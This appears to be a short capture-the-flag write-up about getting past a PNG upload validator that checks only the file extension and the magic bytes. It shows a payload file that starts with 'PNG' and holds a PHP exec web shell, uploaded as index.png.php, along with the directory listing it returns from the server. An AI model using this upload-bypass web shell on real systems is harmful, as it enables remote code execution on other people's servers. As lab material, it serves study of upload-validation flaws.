Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.

image uploads are stored in /uploads/ directory

Construct file as payload
PNG"
<?php echo exec("cd /var/www/html/ && echo *");?>

navigate to /uploads/index.png.php

output:
PNG" MFRDAZLDMUYDG.txt index.php instructions.txt robots.txt uploads
